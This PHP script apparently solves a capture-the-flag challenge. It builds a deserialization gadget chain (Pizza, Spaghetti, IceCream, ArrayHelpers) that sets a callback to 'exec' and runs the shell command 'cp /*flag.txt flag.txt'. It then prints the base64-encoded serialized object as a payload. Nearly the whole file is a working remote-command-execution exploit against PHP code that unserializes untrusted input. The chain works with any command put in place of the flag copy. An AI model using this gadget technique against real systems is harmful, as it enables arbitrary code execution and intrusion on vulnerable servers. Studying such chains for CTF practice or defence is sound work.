<?php

use Helpers\ArrayHelpers;
require_once 'challenge/Helpers/ArrayHelpers.php';
class Size
{
    public $what;

    public function __construct($what)
    {
        $this->what = $what;
    }
}

class IceCream
{
    public $flavors;
    public $topping;

    // public function __invoke()
    // {
    //     foreach ($this->flavors as $flavor) {
    //         echo $flavor;
    //     }
    // }
}

// class ArrayHelpers extends ArrayIterator
// {
//     public $callback;

//     public function current()
//     {
//         $value = parent::current();
//         $debug = call_user_func($this->callback, $value);
//         return $value;
//     }
// }

class Spaghetti
{
    public $sauce;
    public $noodles;
    public $portion;

    // public function __get($tomato)
    // {
    //     ($this->sauce)();
    // }
}

class Pizza
{
    public $price;
    public $cheese;
    public $size;

    // public function __destruct()
    // {
    //     echo "Size: " . $this->size->what . "\n";
    // }
}

$my_array = new ArrayHelpers(['cp /*flag.txt flag.txt']);
$my_array->callback = 'exec';

$my_icecream = new IceCream();
$my_icecream->flavors = $my_array;

$my_spaghetti = new Spaghetti();
$my_spaghetti->sauce = $my_icecream;

$payload = new Pizza();
$payload->size = $my_spaghetti;


echo base64_encode(serialize(value: $payload));